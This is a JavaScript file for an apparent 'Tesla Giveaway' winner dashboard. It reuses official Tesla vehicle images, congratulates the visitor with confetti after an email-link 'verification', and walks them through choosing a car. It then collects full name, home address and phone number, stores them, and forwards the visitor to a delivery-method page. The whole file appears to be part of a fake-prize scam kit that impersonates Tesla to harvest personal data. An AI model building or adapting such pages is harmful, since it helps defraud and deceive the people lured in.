// ╔══════════════════════════════════════════════════════════╗
// ║     Tesla Giveaway — Winner Dashboard Logic              ║
// ╚══════════════════════════════════════════════════════════╝

var cars = [
  { id:'model3',  name:'Model 3',    color:'Pearl White',      price:'$38,990',  emoji:'🚗',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png',
    specs:['3.1s 0–60','333mi Range','AWD Dual Motor','5★ Safety'], badge:'Most Popular' },
  { id:'modely',  name:'Model Y',    color:'Midnight Silver',  price:'$44,990',  emoji:'🚙',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png',
    specs:['3.5s 0–60','330mi Range','76 cu ft Cargo','7 Seats'], badge:'Best Seller' },
  { id:'models',  name:'Model S',    color:'Ultra Red',        price:'$74,990',  emoji:'🏎️',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png',
    specs:['1.99s 0–60','396mi Range','1,020 hp Plaid','200mph Top'], badge:'Ludicrous' },
  { id:'modelx',  name:'Model X',    color:'Deep Blue',        price:'$79,990',  emoji:'🚐',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png',
    specs:['2.5s 0–60','333mi Range','Falcon Wing Doors','7 Seats'], badge:'Iconic' },
  { id:'cybertruck', name:'Cybertruck', color:'Stainless Steel', price:'$60,990', emoji:'🛻',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png',
    specs:['2.6s 0–60','340mi Range','11,000lb Towing','Exo-skeleton'], badge:'Tough' },
  { id:'roadster', name:'Roadster',  color:'Signature Red',    price:'$200,000', emoji:'🏎️',
    img:'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png',
    specs:['1.1s 0–60','620mi Range','250+ mph Top','4 Seats'], badge:'Ultimate' },
];

var selectedCar = null;

// ── INIT ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async function() {
  // Persist session from email-verify redirect
  var urlSession = getParam('session');
  if (urlSession) {
    saveSession(urlSession);
    // Clean URL
    if (window.history && window.history.replaceState) {
      window.history.replaceState(null, '', 'dashboard.html');
    }
  }

  var session = getSession();
  if (!session) { 
    window.location.href = 'entry.html'; 
    return; 
  }

  try {
    var data = await apiCall('/session?token=' + encodeURIComponent(session));
    if (!data.valid) { 
      clearSession(); 
      window.location.href = 'entry.html'; 
      return; 
    }

    // Show verified banner (only when coming from email link)
    if (urlSession) {
      var banner = document.getElementById('verifiedBanner');
      if (banner) {
        banner.style.display = 'flex';
        var nameDisplay = document.getElementById('userNameDisplay');
        if (nameDisplay) {
          nameDisplay.textContent = data.user.firstName || data.user.email.split('@')[0];
        }
      }
      // Launch confetti!
      launchConfetti(50);
    }

    window._userData = data.user;

    // Pre-fill name in delivery form
    var nameInput = document.querySelector('[name="fullName"]');
    if (nameInput && data.user.firstName) {
      nameInput.value = (data.user.firstName + ' ' + (data.user.lastName || '')).trim();
    }
    var phoneInput = document.querySelector('[name="deliveryPhone"]');
    if (phoneInput && data.user.phone) phoneInput.value = data.user.phone;

  } catch (err) { 
    clearSession(); 
    window.location.href = 'entry.html'; 
    return; 
  }

  renderCars();
});

// ── CAR GRID ──────────────────────────────────────────────────
function renderCars() {
  var grid = document.getElementById('carGrid');
  if (!grid) return;
  
  grid.innerHTML = cars.map(function(car) {
    return '<div class="car-card" onclick="selectCar(\'' + car.id + '\')" id="card-' + car.id + '">' +
      '<div class="sel-check">✓</div>' +
      '<div class="car-img-area">' +
        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" ' +
          'onerror="this.outerHTML=\'<div style=\\\'font-size:52px;padding:30px;\\\'>' + car.emoji + '</div>\'" ' +
          'loading="lazy">' +
      '</div>' +
      '<div class="car-body">' +
        '<div class="car-badge">' + car.badge + '</div>' +
        '<div class="car-title">Tesla ' + car.name + '</div>' +
        '<div class="car-meta">' + car.color + ' · ' + car.price + '</div>' +
        '<div class="car-specs">' +
          car.specs.map(function(s) { return '<span class="car-spec-pill">' + s + '</span>'; }).join('') +
        '</div>' +
      '</div>' +
    '</div>';
  }).join('');
}

function selectCar(carId) {
  var cards = document.querySelectorAll('.car-card');
  for (var i = 0; i < cards.length; i++) cards[i].classList.remove('selected');
  
  var card = document.getElementById('card-' + carId);
  if (card) { 
    card.classList.add('selected'); 
    card.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); 
  }
  
  selectedCar = null;
  for (var j = 0; j < cars.length; j++) {
    if (cars[j].id === carId) { selectedCar = cars[j]; break; }
  }
  
  var btn = document.getElementById('confirmCarBtn');
  if (btn) { btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer'; }
}

function confirmCar() {
  if (!selectedCar) {
    showToast('Please select a Tesla vehicle first.', 'warning');
    return;
  }
  
  // Update step bar
  setStep(3);
  document.getElementById('stepSelectCar').style.display = 'none';
  var deliveryStep = document.getElementById('stepDelivery');
  deliveryStep.style.display = 'block';
  deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
  
  // Update selected car summary
  document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
  document.getElementById('selectedCarColor').textContent = selectedCar.color;
  document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
}

function goBackToCars() {
  setStep(2);
  document.getElementById('stepDelivery').style.display = 'none';
  document.getElementById('stepSelectCar').style.display = 'block';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── STEP INDICATOR ────────────────────────────────────────────
function setStep(n) {
  var stepIds = ['sc1','sc2','sc3','sc4'];
  var labelIds = ['sl1t','sl2t','sl3t','sl4t'];
  var lineIds = ['sl1','sl2','sl3'];
  
  for (var i = 0; i < stepIds.length; i++) {
    var stepNum = i + 1;
    var circle = document.getElementById(stepIds[i]);
    var label = document.getElementById(labelIds[i]);
    
    if (!circle) continue;
    
    if (stepNum < n) {
      circle.className = 's-circle done'; 
      circle.textContent = '✓';
      if (label) label.className = 's-label done';
    } else if (stepNum === n) {
      circle.className = 's-circle active'; 
      circle.textContent = String(stepNum);
      if (label) label.className = 's-label active';
    } else {
      circle.className = 's-circle'; 
      circle.textContent = String(stepNum);
      if (label) label.className = 's-label';
    }
  }
  
  for (var j = 0; j < lineIds.length; j++) {
    var line = document.getElementById(lineIds[j]);
    if (!line) continue;
    if (j + 2 < n) {
      line.className = 's-line done';
    } else {
      line.className = 's-line';
    }
  }
}

// ── DELIVERY FORM ─────────────────────────────────────────────
document.addEventListener('submit', async function(e) {
  if (e.target.id !== 'deliveryForm') return;
  e.preventDefault();
  var form = e.target;

  var deliveryDetails = {
    fullName:      (form.fullName && form.fullName.value || '').trim(),
    address:       (form.address && form.address.value || '').trim(),
    city:          (form.city && form.city.value || '').trim(),
    state:         (form.state && form.state.value || '').trim(),
    zipCode:       (form.zipCode && form.zipCode.value || '').trim(),
    country:       (form.country && form.country.value || '').trim(),
    phone:         (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
    instructions:  (form.instructions && form.instructions.value || '').trim(),
  };

  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city ||
      !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
    showToast('Please fill in all required fields.', 'error');
    return;
  }

  // Save to localStorage and proceed to delivery method page
  try {
    localStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
    localStorage.setItem('tesla_session_token', getSession());
  } catch(e) {
    showToast('Unable to save your progress. Please try again.', 'error');
    return;
  }

  window.location.href = 'delivery-method.html';
});

function logout() {
  clearSession();
  try {
    localStorage.removeItem('tesla_selected_car');
    localStorage.removeItem('tesla_delivery_details');
    localStorage.removeItem('tesla_delivery_method');
    localStorage.removeItem('tesla_last_order');
  } catch(e) {}
  window.location.href = 'index.html';
}
